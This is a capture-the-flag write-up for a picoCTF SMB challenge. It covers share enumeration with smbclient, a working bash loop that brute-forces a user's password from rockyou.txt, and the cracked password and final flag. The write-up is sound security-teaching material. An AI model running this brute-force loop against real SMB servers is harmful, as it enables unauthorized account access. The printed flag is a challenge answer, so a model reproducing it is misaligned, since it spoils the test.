# PRINTER SHARES 2 PROBLEM GUIDE:

*(General Skills — Medium, 200pt)*

## HINTS:
Hint 1: There's a `secure-shares` you can't reach yet.
Hint 2: A note says user Joe still uses the default password — brute force it.

## TOOLS:
`$ smbclient -L //<host>/ -p <port> -N`

`$ smbclient //<host>/<share> -p <port> -U <user>%<pass>`

rockyou.txt + a bash loop

## WALKTHROUGH:
1. `$ smbclient -L //green-hill.picoctf.net -p <port> -N`
    - Two shares: public `shares`, restricted `secure-shares` (ACCESS_DENIED)

2. Pull the files from `shares`; `notification.txt` reveals user **Joe** is on the default password.

3. `hydra`/`ncrack` fail here (server rejects SMBv1 / freezes). Loop `smbclient` directly against rockyou:
```bash
#!/bin/bash
WORDLIST="/usr/share/wordlists/rockyou.txt"
while IFS= read -r password; do
  smbclient "//green-hill.picoctf.net/secure-shares" -p <port> -U "joe%$password" -c 'ls' >/dev/null 2>&1
  if [ $? -eq 0 ]; then echo "Password: $password"; break; fi
done < "$WORDLIST"
```
    - `-c 'ls'` makes each login run one command and exit, so the loop never hangs
    - Found: `popcorn`

4. `$ smbclient //green-hill.picoctf.net/secure-shares -p <port> -U joe`  (password `popcorn`), then `get flag.txt`
    - Answer: `picoCTF{5mb_pr1nter_5h4re5_5ecure_d5e6bb0b}`

## NOTES:
- When off-the-shelf crackers choke on SMB version quirks, a `smbclient -c` loop is a reliable fallback.
- Builds on [[printer-shares]]; [[printer-shares-3]] moves from reading to writing.
